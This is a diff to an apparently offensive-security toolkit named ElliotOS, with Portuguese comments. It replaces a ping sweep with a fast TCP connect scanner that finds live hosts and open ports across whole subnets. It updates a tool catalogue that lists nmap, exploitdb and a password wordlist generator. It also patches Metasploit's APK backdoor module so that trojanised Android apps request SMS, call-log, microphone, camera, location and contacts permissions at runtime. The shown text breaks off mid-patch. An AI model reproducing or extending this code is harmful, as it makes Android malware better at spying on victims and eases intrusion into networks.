-static void *scan_host_worker(void *arg) {
-    ScanHostJob *j = (ScanHostJob *)arg;
-    uint32_t h = j->ip;
-    char ipstr[20];
-    snprintf(ipstr, sizeof(ipstr), "%u.%u.%u.%u",
-        (h>>24)&0xFF, (h>>16)&0xFF, (h>>8)&0xFF, h&0xFF);
-    char cmd[128];
-    /* ping -c1 -W<sec> — funciona sem root no Termux */
-    snprintf(cmd, sizeof(cmd),
-        "ping -c1 -W%d %s >/dev/null 2>&1", j->timeout_sec, ipstr);
-    if (system(cmd) == 0) j->alive = 1;
-    return NULL;
-}
-
+/* ── net.ip: SYN discovery + port scan — igual ao net.scan mas para CIDRs ──
+ *
+ *  net.ip()                          → descobre rede local, probe portas comuns
+ *  net.ip("192.168.1.0/24")             → dado CIDR, probe portas comuns
+ *  net.ip("192.168.1.0/24", 1, 1024) → dado CIDR, SYN scan portas 1-1024
+ *  net.ip(1, 1024)                   → auto CIDR, SYN scan portas 1-1024
+ *
+ *  Fase 1 (discovery): SYN probe em portas comuns em batch de 512 hosts
+ *                      simultaneamente — RST ou SYN-ACK = host vivo.
+ *  Fase 2 (scan):      SYN scan do range [from,to] só nos hosts vivos.
+ * ─────────────────────────────────────────────────────────────────────────── */
 static int parse_cidr(const char *s, uint32_t *base, int *prefix) {
     char buf[64]; strncpy(buf, s, 63); buf[63]='\0';
     char *slash = strchr(buf, '/');
@@ -86446,202 +86658,287 @@ static int l_net_os(lua_State *L) {
     return 1;
 }
 
-static int l_net_scan_hosts(lua_State *L) {
-    char     cidr_str[64] = {0};
-    int      timeout_sec  = 1;
-
-    /* Aceita: net.hosts() | net.hosts("192.168.1") | net.hosts("192.168.1.0/24") */
-    if (lua_gettop(L) >= 1) {
-        if (lua_isstring(L, 1))
-            strncpy(cidr_str, lua_tostring(L, 1), 63);
-        else if (lua_isnumber(L, 1))
-            timeout_sec = (int)lua_tointeger(L, 1);
+/* ── net_detect_local_cidr ────────────────────────────────────────────────────
+   Detecta a rede local via getifaddrs() (C direto, sem shell).
+   Pula loopback (127.x) e link-local (169.254.x).
+   Retorna 1 e preenche *out com "a.b.c.d/prefix", ou 0 se falhou.
+   ─────────────────────────────────────────────────────────────────────────── */
+static int net_detect_local_cidr(char *out, size_t outsz) {
+    struct ifaddrs *ifa_list = NULL;
+    if (getifaddrs(&ifa_list) != 0) return 0;
+    int found = 0;
+    for (struct ifaddrs *ifa = ifa_list; ifa && !found; ifa = ifa->ifa_next) {
+        if (!ifa->ifa_addr   || ifa->ifa_addr->sa_family   != AF_INET) continue;
+        if (!ifa->ifa_netmask|| ifa->ifa_netmask->sa_family != AF_INET) continue;
+        struct sockaddr_in *sin  = (struct sockaddr_in*)ifa->ifa_addr;
+        struct sockaddr_in *smsk = (struct sockaddr_in*)ifa->ifa_netmask;
+        uint32_t ip = ntohl(sin->sin_addr.s_addr);
+        uint32_t nm = ntohl(smsk->sin_addr.s_addr);
+        uint8_t  o1 = (ip >> 24) & 0xFF;
+        uint8_t  o2 = (ip >> 16) & 0xFF;
+        if (o1 == 127)              continue;
+        if (o1 == 169 && o2 == 254) continue;
+        int prefix = __builtin_popcount(nm);
+        if (prefix < 8 || prefix > 30) continue;
+        uint32_t net = ip & nm;
+        snprintf(out, outsz, "%u.%u.%u.%u/%d",
+            (net>>24)&0xFF, (net>>16)&0xFF, (net>>8)&0xFF, net&0xFF, prefix);
+        found = 1;
     }
-    if (lua_gettop(L) >= 2 && lua_isnumber(L, 2))
-        timeout_sec = (int)lua_tointeger(L, 2);
-    if (timeout_sec < 1) timeout_sec = 1;
-    if (timeout_sec > 5) timeout_sec = 5;
+    freeifaddrs(ifa_list);
+    return found;
+}
 
-    /* Se não passou CIDR, detecta a rede local pelo gateway */
+
+static int l_net_scan_hosts(lua_State *L) {
+    char cidr_str[64] = {0};
+    int from = 0, to = 0;
+
+    int nargs = lua_gettop(L);
+    if (nargs >= 1) {
+        if (lua_isnil(L, 1)) {
+            /* net.ip(nil, from, to) — auto CIDR, portas explícitas */
+            if (nargs >= 2 && lua_isnumber(L, 2)) from = (int)lua_tointeger(L, 2);
+            if (nargs >= 3 && lua_isnumber(L, 3)) to   = (int)lua_tointeger(L, 3);
+        } else if (lua_isnumber(L, 1)) {
+            /* net.ip(from, to) — auto CIDR, portas como args 1 e 2 */
+            from = (int)lua_tointeger(L, 1);
+            if (nargs >= 2 && lua_isnumber(L, 2)) to = (int)lua_tointeger(L, 2);
+        } else if (lua_isstring(L, 1)) {
+            /* net.ip("cidr" [, from [, to]]) */
+            strncpy(cidr_str, lua_tostring(L, 1), 63);
+            if (nargs >= 2 && lua_isnumber(L, 2)) from = (int)lua_tointeger(L, 2);
+            if (nargs >= 3 && lua_isnumber(L, 3)) to   = (int)lua_tointeger(L, 3);
+        }
+    }
+    if (from < 1)     from = 0;
+    if (to   > 65535) to   = 65535;
+    if (from > 0 && to > 0 && from > to) { int t=from; from=to; to=t; }
+
+    /* Auto-detect CIDR — 3 métodos */
     if (cidr_str[0] == '\0') {
-        FILE *fp = popen(
-            "ip route 2>/dev/null | grep -v default"
-            " | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+/[0-9]+'"
-            " | head -1", "r");
-        if (fp) { fgets(cidr_str, sizeof(cidr_str), fp); pclose(fp); }
-        /* remove trailing newline */
-        char *nl = strchr(cidr_str, '\n');
-        if (nl) *nl = '\0';
+        if (!net_detect_local_cidr(cidr_str, sizeof(cidr_str))) {
+            FILE *fp = popen(
+                "ip route 2>/dev/null | grep -v default"
+                " | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+/[0-9]+'"
+                " | grep -v '^169\\.' | head -1", "r");
+            if (fp) { fgets(cidr_str, sizeof(cidr_str), fp); pclose(fp); }
+            char *nl=strchr(cidr_str,'\n'); if(nl)*nl='\0';
+        }
+        if (cidr_str[0] == '\0') {
+            FILE *fp = popen(
+                "ip addr 2>/dev/null | grep 'inet '"
+                " | grep -v ' 127\\.' | grep -v ' 169\\.254'"
+                " | grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+/[0-9]+'"
+                " | head -1", "r");
+            if (fp) { fgets(cidr_str, sizeof(cidr_str), fp); pclose(fp); }
+            char *nl=strchr(cidr_str,'\n'); if(nl)*nl='\0';
+        }
     }
     if (cidr_str[0] == '\0') {
         lua_pushnil(L);
-        lua_pushstring(L, "não detectou rede local — passe o CIDR: net.hosts('192.168.1.0/24')");
+        lua_pushstring(L,"nao detectou rede local -- passe o CIDR: net.ip('192.168.1.0/24')");
         return 2;
     }
 
     uint32_t base; int prefix;
     if (!parse_cidr(cidr_str, &base, &prefix)) {
-        lua_pushnil(L);
-        lua_pushfstring(L, "CIDR inválido: %s", cidr_str);
-        return 2;
+        lua_pushnil(L); lua_pushfstring(L,"CIDR invalido: %s",cidr_str); return 2;
     }
     if (prefix < 16 || prefix > 30) {
-        lua_pushnil(L);
-        lua_pushstring(L, "prefix deve ser /16 a /30");
-        return 2;
+        lua_pushnil(L); lua_pushstring(L,"prefix deve ser /16 a /30"); return 2;
     }
 
-    uint32_t mask     = 0xFFFFFFFF << (32 - prefix);
+    uint32_t mask     = 0xFFFFFFFF << (32-prefix);
     uint32_t net_addr = base & mask;
     uint32_t bcast    = net_addr | (~mask);
     int      n_hosts  = (int)(bcast - net_addr - 1);
     if (n_hosts <= 0) n_hosts = 1;
-    if (n_hosts > 1024) n_hosts = 1024;
+    if (n_hosts > 65534) n_hosts = 65534;
 
-    ScanHostJob *jobs = (ScanHostJob *)calloc(n_hosts, sizeof(ScanHostJob));
-    pthread_t   *tids = (pthread_t   *)calloc(n_hosts, sizeof(pthread_t));
-    if (!jobs || !tids) { free(jobs); free(tids);
-        lua_pushnil(L); lua_pushstring(L,"sem memória"); return 2; }
+    int do_scan = (from > 0 && to > 0);
 
-    printf("\033[1;36m[net.ip]\033[0m %s — %d hosts, ping -%ds\n",
-        cidr_str, n_hosts, timeout_sec);
+    struct timeval h_t0, h_t1;
+    gettimeofday(&h_t0, NULL);
 
-    for (int i = 0; i < n_hosts; i++) {
-        jobs[i].ip          = net_addr + 1 + (uint32_t)i;
-        jobs[i].alive       = 0;
-        jobs[i].timeout_sec = timeout_sec;
-        pthread_create(&tids[i], NULL, scan_host_worker, &jobs[i]);
+    if (do_scan)
+        printf("\n\033[1;36m[net.ip] SYN scan -- %s  portas %d-%d  (%d hosts)\033[0m\n\n",
+               cidr_str, from, to, n_hosts);
+    else
+        printf("\n\033[1;36m[net.ip] SYN discovery -- %s  (%d hosts)\033[0m\n\n",
+               cidr_str, n_hosts);
+
+    /* ── Fase 1: discovery — batch de 512 hosts por vez em portas comuns ──
+     * RST (ECONNREFUSED) e SYN-ACK (err==0) ambos confirmam host vivo.
+     * So timeout = host morto ou filtrado.
+     * ─────────────────────────────────────────────────────────────────── */
+    static const int PROBE_PORTS[] = {80,443,22,8080,445,21,23,8443,3389,53,25,3306};
+    #define N_PROBE  12
+    #define HB       512
+
+    uint8_t *alive = (uint8_t*)calloc((size_t)n_hosts, 1);
+    if (!alive) { lua_newtable(L); return 1; }
+
+    int disc_total = n_hosts * N_PROBE;
+    int disc_done  = 0;
+
+    for (int pp = 0; pp < N_PROBE; pp++) {
+        int pport = PROBE_PORTS[pp];
+        int hi    = 0;
+        while (hi < n_hosts) {
+            int nb = 0;
+            int     fds[HB];
+            int     idx[HB];
+            struct pollfd pfds[HB];
+
+            while (nb < HB && hi < n_hosts) {
+                if (alive[hi]) { hi++; continue; }
+                uint32_t hip = net_addr + 1 + (uint32_t)hi;
+                int fd = socket(AF_INET, SOCK_STREAM|SOCK_NONBLOCK, 0);
+                if (fd < 0) { hi++; continue; }
+                struct sockaddr_in sa; memset(&sa,0,sizeof(sa));
+                sa.sin_family      = AF_INET;
+                sa.sin_addr.s_addr = htonl(hip);
+                sa.sin_port        = htons((uint16_t)pport);
+                connect(fd,(struct sockaddr*)&sa,sizeof(sa));
+                fds[nb] = fd; idx[nb] = hi;
+                pfds[nb].fd = fd; pfds[nb].events = POLLOUT|POLLERR; pfds[nb].revents = 0;
+                nb++; hi++;
+            }
+
+            poll(pfds, nb, 200);
+
+            for (int i = 0; i < nb; i++) {
+                if (pfds[i].revents & (POLLOUT|POLLERR)) {
+                    int err=0; socklen_t el=sizeof(err);
+                    getsockopt(fds[i],SOL_SOCKET,SO_ERROR,&err,&el);
+                    if (err == 0 || err == ECONNREFUSED)
+                        alive[idx[i]] = 1;
+                }
+                struct linger sl={1,0};
+                setsockopt(fds[i],SOL_SOCKET,SO_LINGER,&sl,sizeof(sl));
+                close(fds[i]);
+            }
+            disc_done += nb;
+            progress_bar(disc_done, disc_total, "hosts:");
+        }
     }
-    for (int i = 0; i < n_hosts; i++) pthread_join(tids[i], NULL);
+    progress_clear();
 
-    /* coleta IPs ativos primeiro */
-    char (*alive_ips)[20] = calloc(n_hosts, 20);
-    int found = 0;
-    for (int i = 0; i < n_hosts; i++) {
-        if (!jobs[i].alive) continue;
-        uint32_t h = jobs[i].ip;
-        snprintf(alive_ips[found], 20, "%u.%u.%u.%u",
-            (h>>24)&0xFF,(h>>16)&0xFF,(h>>8)&0xFF,h&0xFF);
-        found++;
+    int alive_count = 0;
+    for (int i = 0; i < n_hosts; i++) if (alive[i]) alive_count++;
+
+    if (alive_count == 0) {
+        free(alive);
+        gettimeofday(&h_t1,NULL);
+        double el=(h_t1.tv_sec-h_t0.tv_sec)+(h_t1.tv_usec-h_t0.tv_usec)/1e6;
+        char tmr[32]={0};
+        if(el<60) snprintf(tmr,sizeof(tmr),"%.1fs",el);
+        else snprintf(tmr,sizeof(tmr),"%dm%ds",(int)(el/60),(int)el%60);
+        printf("\033[1;33m  [-] Nenhum host ativo em %s\033[0m  \033[0;90m(%s)\033[0m\n",
+               cidr_str,tmr);
+        lua_newtable(L); return 1;
     }
-    free(jobs); free(tids);
 
-    printf("\033[1;36m[net.ip]\033[0m \033[1;32m%d host(s) ativos — iniciando fingerprint...\033[0m\n\n",
-           found);
+    printf("\033[1;36m[*]\033[0m \033[1;32m%d host(s) ativos\033[0m%s\n\n",
+           alive_count, do_scan ? " -- iniciando port scan..." : ":");
 
-    /* tabela de retorno: array de tabelas com fingerprint */
     lua_newtable(L);
 
-    for (int i = 0; i < found; i++) {
-        const char *ipstr = alive_ips[i];
+    /* ── Fase 2: SYN port scan em cada host vivo ────────────────────────────
+     * Mesmo engine do net.scan: SOCK_NONBLOCK + batch 512 + poll 200ms + SO_LINGER.
+     * ─────────────────────────────────────────────────────────────────────── */
+    #define HS_BATCH 512
 
-        /* ── fingerprint inline (sem chamar l_net_os para não duplicar L) ── */
-        printf("\033[1;36m┌─[net.ip]\033[0m \033[1;37m%s\033[0m\n", ipstr);
+    for (int i = 0; i < n_hosts; i++) {
+        if (!alive[i]) continue;
+        uint32_t hip = net_addr + 1 + (uint32_t)i;
+        char ipstr[20];
+        snprintf(ipstr,sizeof(ipstr),"%u.%u.%u.%u",
+            (hip>>24)&0xFF,(hip>>16)&0xFF,(hip>>8)&0xFF,hip&0xFF);
 
-        /* resolve sockaddr */
-        struct sockaddr_in sa;
-        memset(&sa, 0, sizeof(sa));
-        sa.sin_family = AF_INET;
-        inet_pton(AF_INET, ipstr, &sa.sin_addr);
-
-        /* TTL */
-        int ttl = nos_get_ttl(ipstr);
-        char os_hint[128] = "desconhecido";
-        char type_str[64] = "unknown";
-        char conf_str[32] = "baixa";
-        nos_ttl_hint(ttl, os_hint, sizeof(os_hint), type_str, sizeof(type_str));
-        if (ttl > 0)
-            printf("\033[1;36m│\033[0m  TTL \033[1;33m%d\033[0m", ttl);
-        else
-            printf("\033[1;36m│\033[0m  TTL \033[0;90m-\033[0m");
-
-        /* port scan top ports */
-        int open_ports[NET_OS_NPORTS], nopen = 0;
-        int pfds_fd[NET_OS_NPORTS];
-        struct pollfd pfds[NET_OS_NPORTS];
-        for (int k = 0; k < NET_OS_NPORTS; k++) {
-            pfds_fd[k] = socket(AF_INET, SOCK_STREAM, 0);
-            pfds[k].fd = pfds_fd[k]; pfds[k].events = POLLOUT|POLLERR; pfds[k].revents = 0;
-            if (pfds_fd[k] < 0) continue;
-            int fl = fcntl(pfds_fd[k], F_GETFL, 0); if (fl<0) fl=0;
-            fcntl(pfds_fd[k], F_SETFL, fl | O_NONBLOCK);
-            struct sockaddr_in dst = sa;
-            dst.sin_port = htons((uint16_t)NET_OS_PORTS[k]);
-            connect(pfds_fd[k], (struct sockaddr*)&dst, sizeof(dst));
+        if (!do_scan) {
+            printf("\033[1;32m  [+] %s\033[0m\n", ipstr);
+            lua_newtable(L);
+            lua_setfield(L,-2,ipstr);
+            continue;
         }
-        poll(pfds, NET_OS_NPORTS, NET_OS_TIMEOUT_MS + 200);
-        for (int k = 0; k < NET_OS_NPORTS; k++) {
-            if (pfds_fd[k] < 0) continue;
-            if (pfds[k].revents & POLLOUT) {
-                int err = 0; socklen_t el = sizeof(err);
-                getsockopt(pfds_fd[k], SOL_SOCKET, SO_ERROR, &err, &el);
-                if (err == 0) open_ports[nopen++] = NET_OS_PORTS[k];
+
+        int open_ports[65536]; int open_count = 0;
+        int     hs_fds[HS_BATCH];
+        int     hs_prt[HS_BATCH];
+        struct pollfd hs_pfds[HS_BATCH];
+
+        struct sockaddr_in base_sa; memset(&base_sa,0,sizeof(base_sa));
+        base_sa.sin_family      = AF_INET;
+        base_sa.sin_addr.s_addr = htonl(hip);
+
+        int hs_total = to - from + 1;
+        int hs_done  = 0;
+
+        int port = from;
+        while (port <= to) {
+            int nb = 0;
+            while (nb < HS_BATCH && port <= to) {
+                int fd = socket(AF_INET,SOCK_STREAM|SOCK_NONBLOCK,0);
+                if (fd < 0) { port++; continue; }
+                struct sockaddr_in sa = base_sa;
+                sa.sin_port = htons((uint16_t)port);
+                connect(fd,(struct sockaddr*)&sa,sizeof(sa));
+                hs_fds[nb]  = fd; hs_prt[nb] = port;
+                hs_pfds[nb].fd = fd; hs_pfds[nb].events = POLLOUT|POLLERR; hs_pfds[nb].revents = 0;
+                nb++; port++;
             }
-            close(pfds_fd[k]);
+            poll(hs_pfds, nb, 200);
+            for (int j = 0; j < nb; j++) {
+                if (hs_pfds[j].revents & POLLOUT) {
+                    int err=0; socklen_t el=sizeof(err);
+                    getsockopt(hs_fds[j],SOL_SOCKET,SO_ERROR,&err,&el);
+                    if (err == 0) open_ports[open_count++] = hs_prt[j];
+                }
+                struct linger sl={1,0};
+                setsockopt(hs_fds[j],SOL_SOCKET,SO_LINGER,&sl,sizeof(sl));
+                close(hs_fds[j]); hs_pfds[j].fd=-1;
+            }
+            hs_done += nb;
+            /* label "IP portas:" para identificar qual host está sendo escaneado */
+            char hs_label[40]={0};
+            snprintf(hs_label, sizeof(hs_label), "\033[0;37m%s\033[0m portas:", ipstr);
+            progress_bar(hs_done, hs_total, hs_label);
         }
+        progress_clear();
 
-        /* portas na mesma linha */
-        if (nopen > 0) {
-            printf("  portas \033[1;32m");
-            for (int k = 0; k < nopen; k++)
-                printf("%d%s", open_ports[k], k<nopen-1?",":"");
+        printf("\033[1;32m  [+] %-16s\033[0m", ipstr);
+        if (open_count > 0) {
+            printf("  \033[1;33mportas:\033[0m \033[1;32m");
+            for (int j=0; j<open_count; j++)
+                printf("%d%s", open_ports[j], j<open_count-1?",":"");
             printf("\033[0m");
+        } else {
+            printf("  \033[0;90m(sem portas abertas em %d-%d)\033[0m", from, to);
         }
         printf("\n");
 
-        /* refina */
-        nos_refine_by_ports(open_ports, nopen,
-                            os_hint, sizeof(os_hint),
-                            type_str, sizeof(type_str),
-                            conf_str, sizeof(conf_str));
-
-        /* HTTP banner */
-        char server_hdr[128] = {0}, powered_hdr[128] = {0};
-        int http_ports[] = {80, 8080, 443, 8443};
-        for (int k = 0; k < 4; k++) {
-            int was_open = 0;
-            for (int j = 0; j < nopen; j++)
-                if (open_ports[j] == http_ports[k]) { was_open = 1; break; }
-            if (!was_open) continue;
-            if (nos_http_banner(ipstr, http_ports[k],
-                                server_hdr, sizeof(server_hdr),
-                                powered_hdr, sizeof(powered_hdr))) break;
-        }
-        nos_refine_by_server(server_hdr, powered_hdr,
-                             os_hint, sizeof(os_hint),
-                             type_str, sizeof(type_str),
-                             conf_str, sizeof(conf_str));
-
-        /* linha de resultado */
-        const char *cc =
-            strcmp(conf_str,"alta")==0  ? "\033[1;32m" :
-            strcmp(conf_str,"média")==0 ? "\033[1;33m" : "\033[1;31m";
-
-        printf("\033[1;36m│\033[0m  \033[1;37m%-28s\033[0m %s%s\033[0m",
-               os_hint, cc, conf_str);
-        if (server_hdr[0])
-            printf("  \033[0;90m(%s)\033[0m", server_hdr);
-        printf("\n\033[1;36m└\033[0m\n");
-
-        /* entrada na tabela Lua: subtabela com fingerprint */
         lua_newtable(L);
-        lua_pushstring(L, ipstr);    lua_setfield(L, -2, "ip");
-        lua_pushinteger(L, ttl);     lua_setfield(L, -2, "ttl");
-        lua_pushstring(L, os_hint);  lua_setfield(L, -2, "os_hint");
-        lua_pushstring(L, type_str); lua_setfield(L, -2, "type");
-        lua_pushstring(L, conf_str); lua_setfield(L, -2, "confidence");
-        if (server_hdr[0])  { lua_pushstring(L, server_hdr);  lua_setfield(L, -2, "server"); }
-        if (powered_hdr[0]) { lua_pushstring(L, powered_hdr); lua_setfield(L, -2, "powered"); }
-        lua_newtable(L);
-        for (int k = 0; k < nopen; k++) {
-            lua_pushinteger(L, open_ports[k]);
-            lua_rawseti(L, -2, k+1);
+        for (int j=0; j<open_count; j++) {
+            lua_pushinteger(L,open_ports[j]);
+            lua_rawseti(L,-2,j+1);
         }
-        lua_setfield(L, -2, "ports");
-        lua_rawseti(L, -2, i+1);
+        lua_setfield(L,-2,ipstr);
     }
 
-    free(alive_ips);
+    #undef HS_BATCH
+    #undef HB
+    #undef N_PROBE
+
+    free(alive);
+    gettimeofday(&h_t1,NULL);
+    double el=(h_t1.tv_sec-h_t0.tv_sec)+(h_t1.tv_usec-h_t0.tv_usec)/1e6;
+    char tmr[32]={0};
+    if(el<60) snprintf(tmr,sizeof(tmr),"%.1fs",el);
+    else snprintf(tmr,sizeof(tmr),"%dm%ds",(int)(el/60),(int)el%60);
+    printf("\n\033[1;36m[net.ip]\033[0m %d host(s) ativos  \033[0;90m(%s)\033[0m\n",
+           alive_count,tmr);
     return 1;
 }
 
@@ -87548,7 +87845,6 @@ static int luaopen_net_thread(lua_State *L) {
 
     lua_pushcfunction(L,l_net_os);       lua_setfield(L,-2,"os");
     lua_pushcfunction(L,l_net_scan_hosts); lua_setfield(L,-2,"ip");
-    lua_pushcfunction(L,l_net_scan_hosts); lua_setfield(L,-2,"hosts");
     lua_setglobal(L,"net");
 
     lua_newtable(L);
@@ -93558,6 +93854,12 @@ obs=$obs
 TOOLEOF
     }
 
+    # Igual ao _mk, mas marca a ferramenta como exclusiva do ElliotOS
+    _mk_builtin() {
+        _mk "$@"
+        printf "builtin=yes\n" >> "$XPM_DB/${1}.tool"
+    }
+
     # ── RECONHECIMENTO / OSINT ────────────────────────────────────────────────
     _mk nmap \
         "Scanner de rede e portas mais usado no mundo" \
@@ -93827,31 +94129,18 @@ TOOLEOF
         "apktool" "iBotPeaches/Apktool" \
         "yes" "Requer OpenJDK; usado também pelo metasploit para embutir payloads em APKs (backdoor)"
 
-    _mk apkfull \
-        "Kit completo de ferramentas APK: apktool + apksigner + aapt + aapt2 + apkeep" \
+    _mk_builtin apkfull \
+        "Kit completo APK: APKEditor + apkinspect + web2apk + apksigner + aapt + aapt2 + apkeep" \
         "Android" \
-        "android,apk,apktool,apksigner,aapt,aapt2,apkeep,kit,sign,decompile" \
+        "android,apk,apkeditor,apkinspect,web2apk,apksigner,aapt,aapt2,apkeep,kit,sign,decompile,build,modern,analysis" \
         "pkg" "linux,android" "all" \
         "apkfull" "" \
-        "yes" "Instala via pkg do Termux: apktool apksigner aapt aapt2 apkeep — compatível com msfvenom -x"
+        "yes" "Tudo sobre APK num só comando: APKEditor, apkinspect, web2apk, apksigner, aapt, aapt2, apkeep"
 
-    _mk apkeditor \
-        "APKEditor — desmonta/monta APKs modernos com suporte nativo a assinatura, split APKs e recursos binários" \
-        "Android" \
-        "android,apk,apkeditor,decompile,build,sign,split,modern" \
-        "pkg" "linux,android" "all" \
-        "apkeditor" "" \
-        "yes" "Requer tur-repo (instalado automaticamente). Uso: apkeditor d -i app.apk / apkeditor b -i pasta/"
 
 
     # ── BUILD / WEB ───────────────────────────────────────────────────────────
-    _mk web2apk \
-        "Converte diretório HTML/CSS/JS em APK Android real — sem root, sem Android Studio" \
-        "Android" \
-        "web,html,css,js,apk,webview,build,converter,pwa" \
-        "Bash+Java" "linux,android" "all" \
-        "web2apk" "" \
-        "yes" "Requer aapt2 ecj dx apksigner. android.jar API 33 baixado automaticamente (~14MB, única vez)"
+
 
     # ── REDE / SNIFFING / MITM ────────────────────────────────────────────────
     _mk mitmproxy \
@@ -93897,6 +94186,19 @@ TOOLEOF
         "Bash" "linux,android" "all" \
         "source" "exploit-database/exploitdb" \
         "yes" "Pacote: exploitdb"
+
+
+    # ── ANDROID / ANÁLISE ────────────────────────────────────────────────────
+
+
+    # ── WORDLISTS / GERAÇÃO ───────────────────────────────────────────────────
+    _mk_builtin wordmagic \
+        "Gerador inteligente de wordlists para fuzzing: combina nome, anos, cidades, sufixos, siglas e leet" \
+        "Wordlists" \
+        "wordlist,fuzz,generator,brute,passwords,custom" \
+        "Python" "linux,android" "all" \
+        "wordmagic" "" \
+        "yes" "Uso: wordmagic empresa.com [-o out.txt] [--full] [--min N] [--max N]"
 
     printf "%s" "$XPM_VERSION" > "$XPM_DB/.seeded"
 }
@@ -94719,6 +95021,139 @@ RBFIXMX
         grep -q 'MSF_AE_MULTIDEX_V2' "$apkrb" 2>/dev/null \
             && _ok "apk.rb: multidex payload configurado" || _warn "Fix MULTIDEX_V2 nao aplicado"
     fi
+
+    # ── Fix RUNTIME_PERMS_V1: requestPermissions() em runtime — Android 6+ (API 23) ──
+    # Problema: msfvenom injeta permissoes no AndroidManifest mas nao gera codigo
+    # Smali para solicitá-las em runtime. No Android 6+, permissoes "dangerous"
+    # precisam de requestPermissions() — so estar no manifesto nao basta.
+    # Fix: adiciona metodo requestAllPerms() no smali do launcher Activity e
+    # injeta a chamada em onCreate(), logo apos super.onCreate().
+    # Idempotente (marcador MSF_AE_RUNTIME_PERMS_V1).
+    if grep -q 'MSF_AE_RUNTIME_PERMS_V1' "$apkrb" 2>/dev/null; then
+        _ok "apk.rb: runtime permissions ja configuradas (V1)"
+    else
+        _info "apk.rb fix runtime_perms_v1: requestPermissions() no launcher Activity..."
+        ruby - "$apkrb" << 'RBFIXRP'
+src = File.read(ARGV[0])
+exit 0 if src.include?('MSF_AE_RUNTIME_PERMS_V1')
+
+# Constroi o codigo Ruby do metodo que sera injetado no apk.rb
+pm = ""
+pm << "\n"
+pm << "  # MSF_AE_RUNTIME_PERMS_V1 — Android 6+: requestPermissions() no launcher Activity\n"
+pm << "  # Chamado em backdoor_apk antes do rebuild para injetar o dialogo de permissoes\n"
+pm << "  def _ae_inject_runtime_perms(tempdir, manifest_doc)\n"
+pm << "    perms_all = %w[\n"
+pm << "      android.permission.READ_EXTERNAL_STORAGE\n"
+pm << "      android.permission.WRITE_EXTERNAL_STORAGE\n"
+pm << "      android.permission.RECORD_AUDIO\n"
+pm << "      android.permission.CAMERA\n"
+pm << "      android.permission.ACCESS_FINE_LOCATION\n"
+pm << "      android.permission.ACCESS_COARSE_LOCATION\n"
+pm << "      android.permission.READ_CONTACTS\n"
+pm << "      android.permission.READ_CALL_LOG\n"
+pm << "      android.permission.READ_SMS\n"
+pm << "      android.permission.PROCESS_OUTGOING_CALLS\n"
+pm << "      android.permission.RECEIVE_SMS\n"
+pm << "      android.permission.GET_ACCOUNTS\n"
+pm << "    ]\n"
+pm << "\n"
+pm << "    # Filtra: apenas permissoes que o msfvenom ja declarou no manifesto\n"
+pm << "    declared = manifest_doc.xpath('//uses-permission').map { |p|\n"
+pm << "      p.attribute('name').to_s\n"
+pm << "    }.reject(&:empty?)\n"
+pm << "    perms = perms_all.select { |p| declared.include?(p) }\n"
+pm << "    return if perms.empty?\n"
+pm << "\n"
+pm << "    # Localiza o launcher Activity (mesmo padrao do MSF_AE_FALLBACK_ACTIVITY)\n"
+pm << "    _pkg = manifest_doc.xpath('//manifest').first['package'].to_s\n"
+pm << "    launcher = nil\n"
+pm << "    manifest_doc.xpath('//activity|//activity-alias').each do |act|\n"
+pm << "      _aname = act.attribute('targetActivity').to_s\n"
+pm << "      _aname = act.attribute('name').to_s if _aname.blank?\n"
+pm << "      next if _aname.blank?\n"
+pm << "      _cats = act.search('category')\n"
+pm << "      _acts = act.search('action')\n"
+pm << "      has_l = _cats.any? { |c| c.attribute('name').to_s.include?('LAUNCHER') }\n"
+pm << "      has_m = _acts.any? { |a| a.attribute('name').to_s.include?('MAIN') }\n"
+pm << "      next unless has_l && has_m\n"
+pm << "      _aname = _pkg + _aname if _aname.start_with?('.')\n"
+pm << "      launcher = _aname\n"
+pm << "      break\n"
+pm << "    end\n"
+pm << "    return if launcher.nil? || launcher.empty?\n"
+pm << "\n"
+pm << "    # Encontra o smali do launcher Activity (APKEditor: smali/classes/**)\n"
+pm << "    fname = launcher.gsub('.', '/') + '.smali'\n"
+pm << "    sfile = Dir.glob(\"\#{tempdir}/original/**/\#{fname}\")\n"
+pm << "                 .select { |f| File.readable?(f) && !File.symlink?(f) }.first\n"
+pm << "    return unless sfile\n"
+pm << "\n"
+pm << "    smali = File.read(sfile)\n"
+pm << "    return if smali.include?('MSF_AE_RUNTIME_PERMS_V1')\n"
+pm << "\n"
+pm << "    cid = launcher.gsub('.', '/')\n"
+pm << "    n   = perms.size\n"
+pm << "\n"
+pm << "    # Constroi as linhas Smali do array de permissoes\n"
+pm << "    arr_lines = perms.each_with_index.map { |p, i|\n"
+pm << "      ri = i < 16 ? \"const/4 v1, 0x\#{i.to_s(16)}\" : \"const/16 v1, 0x\#{i.to_s(16)}\"\n"
+pm << "      \"    \#{ri}\\n    const-string v2, \\\"\#{p}\\\"\\n    aput-object v2, v0, v1\"\n"
+pm << "    }.join(\"\\n\\n\")\n"
+pm << "\n"
+pm << "    meth_smali =\n"
+pm << "      \"\\n# MSF_AE_RUNTIME_PERMS_V1\\n\" \\\n"
+pm << "      \".method private requestAllPerms()V\\n\" \\\n"
+pm << "      \"    .registers 4\\n\\n\" \\\n"
+pm << "      \"    const/16 v0, 0x\#{n.to_s(16)}\\n\" \\\n"
+pm << "      \"    new-array v0, v0, [Ljava/lang/String;\\n\\n\" \\\n"
+pm << "      \"\#{arr_lines}\\n\\n\" \\\n"
+pm << "      \"    const/16 v1, 0x1337\\n\" \\\n"
+pm << "      \"    invoke-virtual {p0, v0, v1}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V\\n\\n\" \\\n"
+pm << "      \"    return-void\\n\" \\\n"
+pm << "      \".end method\\n\"\n"
+pm << "\n"
+pm << "    # Injeta o metodo antes do bloco virtual methods (ou no final)\n"
+pm << "    if smali.include?('# virtual methods')\n"
+pm << "      smali = smali.sub('# virtual methods', meth_smali + \"\\n# virtual methods\")\n"
+pm << "    elsif smali.include?('# direct methods')\n"
+pm << "      smali = smali.sub('# direct methods', meth_smali + \"\\n# direct methods\")\n"
+pm << "    else\n"
+pm << "      smali += \"\\n\" + meth_smali\n"
+pm << "    end\n"
+pm << "\n"
+pm << "    # Injeta chamada em onCreate logo apos invoke-super onCreate\n"
+pm << "    call_inj = \"    invoke-direct {p0}, L\#{cid};->requestAllPerms()V\\n\"\n"
+pm << "    smali = smali.gsub(\n"
